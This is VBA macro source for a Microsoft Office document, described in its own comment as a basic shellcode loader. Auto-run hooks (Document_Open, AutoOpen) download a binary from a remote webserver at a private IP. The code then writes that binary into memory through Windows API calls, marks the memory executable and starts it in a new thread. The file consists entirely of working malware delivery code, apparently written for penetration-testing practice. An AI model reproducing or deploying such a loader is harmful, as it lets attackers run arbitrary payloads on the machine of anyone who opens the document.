' Basic shellcode loader in VBA, the shellcode is fetched from a remote webserver

Private Declare PtrSafe Function Allocate Lib "KERNEL32" Alias "VirtualAlloc" (ByVal addr As LongPtr, ByVal size As Long, ByVal alloc_type As Long, ByVal memProtect As Long) As LongPtr
Private Declare Function Protect Lib "KERNEL32" Alias "VirtualProtect" (ByVal addr As LongPtr, ByVal size As Long, ByVal new_protect As Long, ByRef old_protect As Long) As Long
Private Declare Function Thread Lib "KERNEL32" Alias "CreateThread" (ByVal sec_attr As Long, ByVal size As Long, ByVal start_fun As LongPtr, ByVal params As LongPtr, ByVal create_flags As Long, ByRef tid As Long) As LongPtr
Private Declare PtrSafe Function Writer Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal destination As LongPtr, ByRef source As Any, ByVal size As Long) As LongPtr


Function Getter(url As String) As Variant
  Dim http As Object
  Dim sc As Variant

  Set http = CreateObject("MSXML2.XMLHTTP")
  http.Open "GET", url, False
  http.Send
  
  If http.Status = 200 Then
    sc = http.responseBody
  Else
    Exit Function
  End If

  Getter = sc
End Function


Function Runner()
  Dim buff As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim old_protect As Long
  Dim url As String

  url = "http://192.168.49.70/sc.bin"
  buff = Getter(url)
  
  addr = Allocate(0, UBound(buff), &H3000, &H4)
  For counter = LBound(buff) To UBound(buff)
    data = buff(counter)
    res = Writer(addr + counter, data, 1)
  Next counter

  res = Protect(addr, UBound(buff), &H20, old_protect)
  res = Thread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
   Runner
End Sub

Sub AutoOpen()
   Runner
End Sub
